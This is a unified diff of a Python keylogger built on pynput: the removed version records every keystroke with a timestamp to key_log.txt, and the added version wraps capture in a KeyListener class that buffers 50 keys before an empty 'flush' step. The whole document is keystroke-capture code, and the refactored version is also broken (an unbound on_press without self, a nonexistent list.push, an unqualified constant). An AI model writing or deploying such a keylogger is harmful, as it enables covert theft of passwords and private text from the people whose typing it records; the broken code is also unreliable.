@@ -1,12 +1,25 @@
 from pynput.keyboard import Key, Listener
-import logging
+from keypress import KeyPress
 
-log_dir = ""
+class KeyListener:
+    BUFFER_CAPACITY = 50
 
-logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')
+    def __init__(self):
+        self.buffered_keys = []
+        with Listener(on_press=on_press) as listener:
+            listener.join()
 
-def on_press(key):
-    logging.info('"{0}"'.format(key))
+    def on_press(key):
+        self.buffered_keys.push('"{0}"'.format(key))
 
-with Listener(on_press=on_press) as listener:
-    listener.join()
+        if len(self.buffered_keys) >= BUFFER_CAPACITY:
+            # Flush buffer
+
+            self.buffered_keys = []
+
+
+def main():
+    KeyListener()
+
+if __name__ == '__main__':
+    main()
